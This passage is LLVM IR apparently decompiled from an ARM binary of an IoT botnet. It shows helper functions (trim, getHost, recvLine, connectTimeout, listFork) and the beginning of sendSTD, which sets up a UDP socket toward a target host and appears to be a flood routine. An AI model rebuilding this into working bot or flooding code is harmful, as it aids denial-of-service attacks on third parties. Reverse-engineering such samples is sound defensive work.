  %stack_var_-44.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-44.132, %dec_label_pc_8aec ], [ %stack_var_-44.0, %dec_label_pc_8e58 ]
  %v2_8e78 = icmp eq i32* %arg1, null
  br i1 %v2_8e78, label %dec_label_pc_8e90, label %dec_label_pc_8e80

dec_label_pc_8e80:                                ; preds = %dec_label_pc_8e74
  %v2_8e84 = load i32, i32* %arg1, align 4
  %v3_8e8c = inttoptr i32 %v2_8e84 to i8*
  store i8 0, i8* %v3_8e8c, align 1
  br label %dec_label_pc_8e90

dec_label_pc_8e90:                                ; preds = %dec_label_pc_8e74, %dec_label_pc_8e80
  ret i32 %stack_var_-44.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-32.4, { 1, 0 }
  uselistorder i8* %stack_var_-32.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-52.0.lcssa, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8* %stack_var_-32.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8b54, { 1, 0 }
  uselistorder i32 %stack_var_-48.0.ph, { 1, 0 }
  uselistorder i8* %v5_8af4, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-44.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-36.133, { 13, 0, 11, 12, 9, 10, 7, 8, 5, 6, 3, 4, 1, 2 }
  uselistorder i32 %stack_var_-32.4.in34, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-18, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32, i32)* @prints, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_8e90, { 1, 0 }
  uselistorder label %dec_label_pc_8e74, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8e58, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8e38, { 1, 0 }
  uselistorder label %dec_label_pc_8c1c, { 1, 0 }
  uselistorder label %dec_label_pc_8bd4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8bc4, { 1, 0 }
  uselistorder label %dec_label_pc_8b50, { 1, 0 }
  uselistorder label %dec_label_pc_8adc, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8ea8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8eb0 = load i32, i32* @fp, align 4
  %v10_8eb0 = load i32, i32* @lr, align 4
  store i32 36536, i32* %stack_var_-16, align 4
  %v2_8eb4 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8eb4, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-44, align 4
  %v2_8ec0 = ptrtoint i32* %stack_var_-8 to i32
  %v2_8ecc = ptrtoint i32* %stack_var_-44 to i32
  %v14_8ed8 = call i32 @print(i32* nonnull %stack_var_-44, i32 %arg2, i32 %v2_8ec0, i32 %v2_8ecc, i32 %arg1, i32 %v2_8ec0, i32 %v3_8eb0, i32 %v1_8ea8, i32 %v10_8eb0, i32 36536, i32 %arg2, i32 %arg3, i32 %arg4)
  ret i32 %v14_8ed8

; uselistorder directives
  uselistorder i32 %v2_8ec0, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_8f10 = call i32 @strlen(i8* %arg1)
  %v2_8f50.pre = load i32, i32* @global_var_22354, align 4
  br label %dec_label_pc_8f30

dec_label_pc_8f30:                                ; preds = %dec_label_pc_8f30, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_8f28, %dec_label_pc_8f30 ]
  %v2_8f3c = add i32 %stack_var_-24.0, %tmp
  %v1_8f40 = inttoptr i32 %v2_8f3c to i8*
  %v2_8f40 = load i8, i8* %v1_8f40, align 1
  %v3_8f40 = zext i8 %v2_8f40 to i32
  %v2_8f44 = mul nuw nsw i32 %v3_8f40, 2
  %v2_8f54 = add i32 %v2_8f44, %v2_8f50.pre
  %v1_8f58 = inttoptr i32 %v2_8f54 to i16*
  %v2_8f58 = load i16, i16* %v1_8f58, align 2
  %v1_8f5c = and i16 %v2_8f58, 32
  %v2_8f60 = icmp eq i16 %v1_8f5c, 0
  %v1_8f28 = add i32 %stack_var_-24.0, 1
  br i1 %v2_8f60, label %dec_label_pc_8f78.preheader, label %dec_label_pc_8f30

dec_label_pc_8f78.preheader:                      ; preds = %dec_label_pc_8f30
  %v1_8f18 = add i32 %v3_8f10, -1
  %v5_8f8410 = icmp slt i32 %v1_8f18, %stack_var_-24.0
  br i1 %v5_8f8410, label %dec_label_pc_9008.preheader, label %dec_label_pc_8f88

dec_label_pc_8f6c:                                ; preds = %dec_label_pc_8f88
  %v1_8f70 = add i32 %stack_var_-20.011, -1
  %v5_8f84 = icmp slt i32 %v1_8f70, %stack_var_-24.0
  br i1 %v5_8f84, label %dec_label_pc_9008.preheader, label %dec_label_pc_8f88

dec_label_pc_8f88:                                ; preds = %dec_label_pc_8f78.preheader, %dec_label_pc_8f6c
  %stack_var_-20.011 = phi i32 [ %v1_8f70, %dec_label_pc_8f6c ], [ %v1_8f18, %dec_label_pc_8f78.preheader ]
  %v2_8f94 = add i32 %stack_var_-20.011, %tmp
  %v1_8f98 = inttoptr i32 %v2_8f94 to i8*
  %v2_8f98 = load i8, i8* %v1_8f98, align 1
  %v3_8f98 = zext i8 %v2_8f98 to i32
  %v2_8f9c = mul nuw nsw i32 %v3_8f98, 2
  %v2_8fac = add i32 %v2_8f9c, %v2_8f50.pre
  %v1_8fb0 = inttoptr i32 %v2_8fac to i16*
  %v2_8fb0 = load i16, i16* %v1_8fb0, align 2
  %v1_8fb4 = and i16 %v2_8fb0, 32
  %v2_8fb8 = icmp eq i16 %v1_8fb4, 0
  br i1 %v2_8fb8, label %dec_label_pc_9008.preheader, label %dec_label_pc_8f6c

dec_label_pc_9008.preheader:                      ; preds = %dec_label_pc_8f6c, %dec_label_pc_8f88, %dec_label_pc_8f78.preheader
  %stack_var_-20.0.lcssa = phi i32 [ %v1_8f18, %dec_label_pc_8f78.preheader ], [ %v1_8f70, %dec_label_pc_8f6c ], [ %stack_var_-20.011, %dec_label_pc_8f88 ]
  br label %dec_label_pc_9008

dec_label_pc_8fcc:                                ; preds = %dec_label_pc_9008
  %v2_8ff0 = add i32 %storemerge1, %tmp
  %v1_8ff4 = inttoptr i32 %v2_8ff0 to i8*
  %v2_8ff4 = load i8, i8* %v1_8ff4, align 1
  %v3_8ff8 = inttoptr i32 %v2_902c to i8*
  store i8 %v2_8ff4, i8* %v3_8ff8, align 1
  %v1_9000 = add i32 %storemerge1, 1
  br label %dec_label_pc_9008

dec_label_pc_9008:                                ; preds = %dec_label_pc_9008.preheader, %dec_label_pc_8fcc
  %storemerge1 = phi i32 [ %v1_9000, %dec_label_pc_8fcc ], [ %stack_var_-24.0, %dec_label_pc_9008.preheader ]
  %v7_9014 = icmp sgt i32 %storemerge1, %stack_var_-20.0.lcssa
  %v2_9020 = sub i32 %storemerge1, %stack_var_-24.0
  %v2_902c = add i32 %v2_9020, %tmp
  br i1 %v7_9014, label %dec_label_pc_9018, label %dec_label_pc_8fcc

dec_label_pc_9018:                                ; preds = %dec_label_pc_9008
  %v3_9034 = inttoptr i32 %v2_902c to i8*
  store i8 0, i8* %v3_9034, align 1
  ret i32 %v3_8f10

; uselistorder directives
  uselistorder i32 %storemerge1, { 2, 3, 0, 1 }
  uselistorder i32 %v1_8f18, { 1, 0, 2 }
  uselistorder i32 %stack_var_-24.0, { 1, 0, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_9008, { 1, 0 }
  uselistorder label %dec_label_pc_9008.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8f88, { 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_9068 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_9068, i32* %arg2, align 4
  %v3_9080 = icmp eq i32 %v1_9068, -1
  %. = zext i1 %v3_9080 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9104.lr.ph:
  %tmp34 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-185 = alloca i8, align 1
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_90b4 = load i32, i32* @fp, align 4
  store i32 %v3_90b4, i32* %stack_var_-16, align 4
  %v5_90dc = call i32 @__GI_memset(i8* %arg2, i32 0, i32 %arg3)
  store i32 30, i32* %stack_var_-184, align 4
  %v2_90f0 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9104

dec_label_pc_9104:                                ; preds = %dec_label_pc_9104.lr.ph, %dec_label_pc_9104
  %storemerge628 = phi i32 [ 0, %dec_label_pc_9104.lr.ph ], [ %v1_9118, %dec_label_pc_9104 ]
  %v5_9110 = mul nuw nsw i32 %storemerge628, 4
  %v6_9110 = add i32 %v5_9110, %v2_90f0
  %v7_9110 = inttoptr i32 %v6_9110 to i32*
  store i32 0, i32* %v7_9110, align 4
  %v1_9118 = add nuw nsw i32 %storemerge628, 1
  %tmp53 = icmp ult i32 %v1_9118, 32
  br i1 %tmp53, label %dec_label_pc_9104, label %dec_label_pc_912c

dec_label_pc_912c:                                ; preds = %dec_label_pc_9104
  %v13_90b4 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9130 = udiv i32 %arg1, 32
  %v3_913c = mul nuw nsw i32 %v3_9130, 4
  %v2_9144 = add nsw i32 %v3_913c, -160
  %v2_9148 = add i32 %v2_9144, %v13_90b4
  %v1_914c = inttoptr i32 %v2_9148 to i32*
  %v2_914c = load i32, i32* %v1_914c, align 4
  %v1_9154 = urem i32 %arg1, 32
  %v6_915c = shl i32 1, %v1_9154
  %v2_9160 = or i32 %v2_914c, %v6_915c
  store i32 %v2_9160, i32* %v1_914c, align 4
  %v1_9180 = add i32 %arg1, 1
  %v2_918c = ptrtoint i32* %stack_var_-184 to i32
  %v5_91a0 = call i32 @__libc_select(i32 %v1_9180, i32 %v2_90f0, i32 0, i32 %v2_90f0, i32 %v2_918c)
  %v5_91b4 = icmp sgt i32 %v5_91a0, 0
  br i1 %v5_91b4, label %dec_label_pc_9334.preheader, label %dec_label_pc_92a0.preheader

dec_label_pc_92a0.preheader:                      ; preds = %dec_label_pc_912c
  %v7_92a824 = icmp slt i32 %tmp34, 10
  br i1 %v7_92a824, label %dec_label_pc_91e0.lr.ph, label %dec_label_pc_9334.preheader

dec_label_pc_91e0.lr.ph:                          ; preds = %dec_label_pc_92a0.preheader, %dec_label_pc_9294
  %stack_var_-44.025 = phi i32 [ %v1_9298, %dec_label_pc_9294 ], [ %tmp34, %dec_label_pc_92a0.preheader ]
  store i32 30, i32* %stack_var_-184, align 4
  br label %dec_label_pc_91e0

dec_label_pc_91e0:                                ; preds = %dec_label_pc_91e0.lr.ph, %dec_label_pc_91e0
  %storemerge716 = phi i32 [ 0, %dec_label_pc_91e0.lr.ph ], [ %v1_91f4, %dec_label_pc_91e0 ]
  %v5_91ec = mul nuw nsw i32 %storemerge716, 4
  %v6_91ec = add i32 %v5_91ec, %v2_90f0
  %v7_91ec = inttoptr i32 %v6_91ec to i32*
  store i32 0, i32* %v7_91ec, align 4
  %v1_91f4 = add nuw nsw i32 %storemerge716, 1
  %tmp54 = icmp ult i32 %v1_91f4, 32
  br i1 %tmp54, label %dec_label_pc_91e0, label %dec_label_pc_9208

dec_label_pc_9208:                                ; preds = %dec_label_pc_91e0
  %v2_9228 = load i32, i32* %v1_914c, align 4
  %v2_923c = or i32 %v2_9228, %v6_915c
  store i32 %v2_923c, i32* %v1_914c, align 4
  %v5_927c = call i32 @__libc_select(i32 %v1_9180, i32 %v2_90f0, i32 0, i32 %v2_90f0, i32 %v2_918c)
  %v5_9290 = icmp sgt i32 %v5_927c, 0
  br i1 %v5_9290, label %dec_label_pc_9334.preheader, label %dec_label_pc_9294

dec_label_pc_9294:                                ; preds = %dec_label_pc_9208
  %v1_9298 = add nsw i32 %stack_var_-44.025, 1
  %v7_92a8 = icmp slt i32 %v1_9298, 10
  br i1 %v7_92a8, label %dec_label_pc_91e0.lr.ph, label %dec_label_pc_9334.preheader

dec_label_pc_9334.preheader:                      ; preds = %dec_label_pc_9294, %dec_label_pc_9208, %dec_label_pc_92a0.preheader, %dec_label_pc_912c
  %v2_92c8 = ptrtoint i8* %stack_var_-185 to i32
  %not.v7_933c58 = icmp sgt i32 %arg3, 1
  %v2_935460 = icmp eq i1 %not.v7_933c58, false
  br i1 %v2_935460, label %dec_label_pc_935c, label %dec_label_pc_92c0

dec_label_pc_92c0:                                ; preds = %dec_label_pc_9334.preheader, %dec_label_pc_9328
  %v1_933863.in = phi i32 [ %v1_933863, %dec_label_pc_9328 ], [ %arg3, %dec_label_pc_9334.preheader ]
  %stack_var_-40.062 = phi i8* [ %v5_9318, %dec_label_pc_9328 ], [ %arg2, %dec_label_pc_9334.preheader ]
  %stack_var_-36.061 = phi i32 [ %v1_932c, %dec_label_pc_9328 ], [ 0, %dec_label_pc_9334.preheader ]
  %v1_933863 = add i32 %v1_933863.in, -1
  %v2_92c4 = load i32, i32* @global_var_22588.46, align 4
  %v5_92dc = call i32 @__libc_recv(i32 %v2_92c4, i32 %v2_92c8, i32 1, i32 0, i32 %v1_933863)
  %v7_92e4 = icmp eq i32 %v5_92dc, 1
  br i1 %v7_92e4, label %dec_label_pc_9304, label %dec_label_pc_92ec

dec_label_pc_92ec:                                ; preds = %dec_label_pc_92c0
  store i8 0, i8* %stack_var_-40.062, align 1
  br label %dec_label_pc_9370

dec_label_pc_9304:                                ; preds = %dec_label_pc_92c0
  %v3_9304 = load i8, i8* %stack_var_-185, align 1
  %v4_9308 = ptrtoint i8* %stack_var_-40.062 to i32
  store i8 %v3_9304, i8* %stack_var_-40.062, align 1
  %v1_9314 = add i32 %v4_9308, 1
  %v5_9318 = inttoptr i32 %v1_9314 to i8*
  %v3_931c = load i8, i8* %stack_var_-185, align 1
  %v7_9320 = icmp eq i8 %v3_931c, 10
  br i1 %v7_9320, label %dec_label_pc_935c, label %dec_label_pc_9328

dec_label_pc_9328:                                ; preds = %dec_label_pc_9304
  %v1_932c = add i32 %stack_var_-36.061, 1
  %not.v7_933c = icmp sgt i32 %v1_933863, 1
  %v2_9354 = icmp eq i1 %not.v7_933c, false
  br i1 %v2_9354, label %dec_label_pc_935c, label %dec_label_pc_92c0

dec_label_pc_935c:                                ; preds = %dec_label_pc_9304, %dec_label_pc_9328, %dec_label_pc_9334.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_9334.preheader ], [ %v1_932c, %dec_label_pc_9328 ], [ %stack_var_-36.061, %dec_label_pc_9304 ]
  %stack_var_-40.1 = phi i8* [ %arg2, %dec_label_pc_9334.preheader ], [ %v5_9318, %dec_label_pc_9328 ], [ %v5_9318, %dec_label_pc_9304 ]
  store i8 0, i8* %stack_var_-40.1, align 1
  br label %dec_label_pc_9370

dec_label_pc_9370:                                ; preds = %dec_label_pc_92ec, %dec_label_pc_935c
  %storemerge = phi i32 [ -1, %dec_label_pc_92ec ], [ %stack_var_-36.0.lcssa, %dec_label_pc_935c ]
  %v2_937c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_937c, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_933863, { 1, 0, 2 }
  uselistorder i8* %stack_var_-40.062, { 1, 2, 0 }
  uselistorder i32 %v1_9298, { 1, 0 }
  uselistorder i32 %storemerge716, { 1, 0 }
  uselistorder i32 %storemerge628, { 1, 0 }
  uselistorder i32 %v2_90f0, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-184, { 0, 2, 1 }
  uselistorder i8* %stack_var_-185, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9370, { 1, 0 }
  uselistorder label %dec_label_pc_935c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_92c0, { 1, 0 }
  uselistorder label %dec_label_pc_91e0, { 1, 0 }
  uselistorder label %dec_label_pc_91e0.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_9104, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg4, i32* @r3, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_938c = load i32, i32* @fp, align 4
  store i32 %v3_938c, i32* %stack_var_-16, align 4
  %v13_938c = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r2, align 4
  %v2_93b4 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_93c4 = or i32 %v2_93b4, 2048
  store i32 %v1_93c4, i32* @r3, align 4
  store i32 %v1_93c4, i32* @r2, align 4
  %v2_93d8 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_93ec = urem i32 %arg3, 65536
  %v1_93f4 = call i32 @__GI_htons(i32 %v3_93ec)
  %v3_9414 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-44)
  %v2_941c = icmp eq i32 %v3_9414, 0
  br i1 %v2_941c, label %dec_label_pc_9430, label %dec_label_pc_9424

dec_label_pc_9424:                                ; preds = %entry
  br label %dec_label_pc_95e8

dec_label_pc_9430:                                ; preds = %entry
  %v3_9444 = bitcast i32* %stack_var_-40 to i8*
  %v4_9444 = call i32 @__GI_memset(i8* %v3_9444, i32 0, i32 8)
  %v2_9448 = ptrtoint i32* %stack_var_-48 to i32
  %v3_9458 = call i32 @__libc_connect(i32 %arg1, i32 %v2_9448, i32 16)
  store i32 %v3_9458, i32* @r3, align 4
  %v1_9468 = icmp slt i32 %v3_9458, 0
  br i1 %v1_9468, label %dec_label_pc_9470, label %dec_label_pc_95ac

dec_label_pc_9470:                                ; preds = %dec_label_pc_9430
  %v0_9470 = call i32 @__GI___errno_location()
  %v1_9478 = inttoptr i32 %v0_9470 to i32*
  %v2_9478 = load i32, i32* %v1_9478, align 4
  %v7_947c = icmp eq i32 %v2_9478, 115
  br i1 %v7_947c, label %dec_label_pc_94a8.lr.ph, label %dec_label_pc_95a0

dec_label_pc_94a8.lr.ph:                          ; preds = %dec_label_pc_9470
  store i32 %arg4, i32* %stack_var_-184, align 4
  %v2_9494 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_94a8

dec_label_pc_94a8:                                ; preds = %dec_label_pc_94a8.lr.ph, %dec_label_pc_94a8
  %storemerge14 = phi i32 [ 0, %dec_label_pc_94a8.lr.ph ], [ %v1_94bc, %dec_label_pc_94a8 ]
  %v5_94b4 = mul nuw nsw i32 %storemerge14, 4
  %v6_94b4 = add i32 %v5_94b4, %v2_9494
  %v7_94b4 = inttoptr i32 %v6_94b4 to i32*
  store i32 0, i32* %v7_94b4, align 4
  %v1_94bc = add nuw nsw i32 %storemerge14, 1
  %tmp28 = icmp ult i32 %v1_94bc, 32
  br i1 %tmp28, label %dec_label_pc_94a8, label %dec_label_pc_94d0

dec_label_pc_94d0:                                ; preds = %dec_label_pc_94a8
  %v3_94d4 = udiv i32 %arg1, 32
  %v3_94e0 = mul nuw nsw i32 %v3_94d4, 4
  %v2_94e8 = add nsw i32 %v3_94e0, -160
  %v2_94ec = add i32 %v2_94e8, %v13_938c
  %v1_94f0 = inttoptr i32 %v2_94ec to i32*
  %v2_94f0 = load i32, i32* %v1_94f0, align 4
  %v1_94f8 = urem i32 %arg1, 32
  %v6_9500 = shl i32 1, %v1_94f8
  %v2_9504 = or i32 %v2_94f0, %v6_9500
  store i32 %v2_9504, i32* %v1_94f0, align 4
  %v1_9524 = add i32 %arg1, 1
  %v2_952c = ptrtoint i32* %stack_var_-184 to i32
  %v5_9544 = call i32 @__libc_select(i32 %v1_9524, i32 0, i32 %v2_9494, i32 0, i32 %v2_952c)
  %tmp29 = icmp slt i32 %v5_9544, 1
  br i1 %tmp29, label %dec_label_pc_9594, label %dec_label_pc_9554

dec_label_pc_9554:                                ; preds = %dec_label_pc_94d0
  store i32 4, i32* %stack_var_-188, align 4
  %v2_955c = ptrtoint i32* %stack_var_-192 to i32
  %v2_9560 = ptrtoint i32* %stack_var_-188 to i32
  %v5_9578 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_955c, i32 %v2_9560)
  %v3_957c = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_957c, i32* @r3, align 4
  %v2_9580 = icmp eq i32 %v3_957c, 0
  br i1 %v2_9580, label %dec_label_pc_95ac, label %dec_label_pc_9588

dec_label_pc_9588:                                ; preds = %dec_label_pc_9554
  br label %dec_label_pc_95e8

dec_label_pc_9594:                                ; preds = %dec_label_pc_94d0
  br label %dec_label_pc_95e8

dec_label_pc_95a0:                                ; preds = %dec_label_pc_9470
  br label %dec_label_pc_95e8

dec_label_pc_95ac:                                ; preds = %dec_label_pc_9430, %dec_label_pc_9554
  store i32 0, i32* @r2, align 4
  %v2_95b8 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_95c8 = and i32 %v2_95b8, -2049
  store i32 %v1_95c8, i32* @r3, align 4
  store i32 %v1_95c8, i32* @r2, align 4
  %v2_95dc = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_95e8

dec_label_pc_95e8:                                ; preds = %dec_label_pc_95a0, %dec_label_pc_9594, %dec_label_pc_9588, %dec_label_pc_9424, %dec_label_pc_95ac
  %stack_var_-212.0 = phi i32 [ 0, %dec_label_pc_9594 ], [ 1, %dec_label_pc_95ac ], [ 0, %dec_label_pc_9588 ], [ 0, %dec_label_pc_95a0 ], [ 0, %dec_label_pc_9424 ]
  ret i32 %stack_var_-212.0

; uselistorder directives
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v2_9494, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0, 6, 7, 8 }
  uselistorder label %dec_label_pc_95e8, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_95ac, { 1, 0 }
  uselistorder label %dec_label_pc_94a8, { 1, 0 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_9600 = load i32, i32* @r4, align 4
  %v6_9600 = load i32, i32* @r5, align 4
  %v9_9600 = load i32, i32* @r6, align 4
  %v12_9600 = load i32, i32* @fp, align 4
  store i32 38408, i32* %stack_var_-4, align 4
  %v2_9604 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9604, i32* @fp, align 4
  %v0_960c = call i32 @__libc_fork()
  %v2_961c = icmp eq i32 %v0_960c, 0
  br i1 %v2_961c, label %dec_label_pc_9788, label %dec_label_pc_9630

dec_label_pc_9630:                                ; preds = %entry
  %v2_9634 = load i32, i32* @global_var_22580.48, align 4
  %v5_9634 = load i32, i32* @global_var_22584.49, align 4
  %v2_9640 = add i32 %v2_9634, 1
  %v3_9640 = icmp eq i32 %v2_9640, 0
  %v4_9644 = zext i1 %v3_9640 to i32
  %v5_9644 = add i32 %v4_9644, %v5_9634
  store i32 %v2_9640, i32* @global_var_22580.48, align 4
  store i32 %v5_9644, i32* @global_var_22584.49, align 4
  %v2_9660 = add i32 %v2_9634, 2
  %v3_9660 = icmp eq i32 %v2_9640, -1
  %v4_9664 = zext i1 %v3_9660 to i32
  %v5_9664 = add i32 %v5_9644, %v4_9664
  %v3_9668 = udiv i32 %v2_9660, 1073741824
  %v3_966c = mul i32 %v5_9664, 4
  %v2_9670 = or i32 %v3_966c, %v3_9668
  store i32 %v2_9670, i32* @r4, align 4
  %v3_9674 = mul i32 %v2_9660, 4
  %v1_967c = call i32 @malloc(i32 %v3_9674)
  br label %dec_label_pc_96d4

dec_label_pc_9694:                                ; preds = %dec_label_pc_96d4, %dec_label_pc_9720
  %v3_9698 = mul i32 %storemerge2, 4
  %v2_96a4 = add i32 %v3_9698, %v1_967c
  %v2_96b8 = load i32, i32* @global_var_25264.51, align 4
  %v2_96bc = add i32 %v2_96b8, %v3_9698
  %v1_96c0 = inttoptr i32 %v2_96bc to i32*
  %v2_96c0 = load i32, i32* %v1_96c0, align 4
  %v2_96c4 = inttoptr i32 %v2_96a4 to i32*
  store i32 %v2_96c0, i32* %v2_96c4, align 4
  %v1_96cc = add i32 %storemerge2, 1
  br label %dec_label_pc_96d4

dec_label_pc_96d4:                                ; preds = %dec_label_pc_9630, %dec_label_pc_9694
  %storemerge2 = phi i32 [ 0, %dec_label_pc_9630 ], [ %v1_96cc, %dec_label_pc_9694 ]
  %v2_96ec = load i32, i32* @global_var_22580.48, align 4
  %v5_96ec = load i32, i32* @global_var_22584.49, align 4
  %v2_9700 = add i32 %v2_96ec, -1
  %v3_9700 = icmp ne i32 %v2_96ec, 0
  %v3_9704 = add i32 %v5_96ec, -1
  %v5_9704 = sext i1 %v3_9700 to i32
  %v9_9718 = icmp eq i32 %v3_9704, %v5_9704
  br i1 %v9_9718, label %dec_label_pc_9720, label %dec_label_pc_9694

dec_label_pc_9720:                                ; preds = %dec_label_pc_96d4
  store i32 %v2_9700, i32* @r5, align 4
  store i32 %storemerge2, i32* @r6, align 4
  %tmp = icmp ugt i32 %v2_9700, %storemerge2
  br i1 %tmp, label %dec_label_pc_9694, label %dec_label_pc_9740

dec_label_pc_9740:                                ; preds = %dec_label_pc_9720
  store i32 %v5_96ec, i32* @r4, align 4
  %v3_9748 = mul i32 %v2_96ec, 4
  %v1_974c = add i32 %v1_967c, -4
  %v2_9758 = add i32 %v1_974c, %v3_9748
  %v2_9760 = inttoptr i32 %v2_9758 to i32*
  store i32 %v0_960c, i32* %v2_9760, align 4
  %v2_9768 = load i32, i32* @global_var_25264.51, align 4
  store i32 %v2_9768, i32* @r0, align 4
  %v0_9770 = call i32 @free()
  store i32 %v1_967c, i32* @global_var_25264.51, align 4
  br label %dec_label_pc_9788

dec_label_pc_9788:                                ; preds = %entry, %dec_label_pc_9740
  store i32 %v3_9600, i32* @r4, align 4
  store i32 %v6_9600, i32* @r5, align 4
  store i32 %v9_9600, i32* @r6, align 4
  store i32 %v12_9600, i32* @fp, align 4
  ret i32 %v0_960c

; uselistorder directives
  uselistorder i32 %storemerge2, { 0, 2, 1, 3 }
  uselistorder i32 %v3_9698, { 1, 0 }
  uselistorder i32 %v1_967c, { 2, 0, 1 }
  uselistorder i32 %v2_9640, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_9788, { 1, 0 }
  uselistorder label %dec_label_pc_96d4, { 1, 0 }
  uselistorder label %dec_label_pc_9694, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_97a8 = load i32, i32* @fp, align 4
  store i32 %v3_97a8, i32* %stack_var_-16, align 4
  store i32 38832, i32* %stack_var_-4, align 4
  %v2_97ac = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_97ac, i32* @fp, align 4
  store i32 %arg4, i32* %stack_var_-104, align 4
  %v8_97cc = icmp sgt i32 %arg4, 4096
  br i1 %v8_97cc, label %dec_label_pc_9960, label %dec_label_pc_97d0

dec_label_pc_97d0:                                ; preds = %entry
  %v13_97a8 = ptrtoint i32* %stack_var_-16 to i32
  %v3_97dc = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_97ec = call i32 @__GI_time(i32* null)
  store i32 %arg1, i32* @r0, align 4
  %v1_9800 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_980c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_980c, i32* @r0, align 4
  %v2_9818 = call i32 @bzero(i32 %v2_980c, i32 16)
  %v1_9820 = add i32 %v1_9800, 16
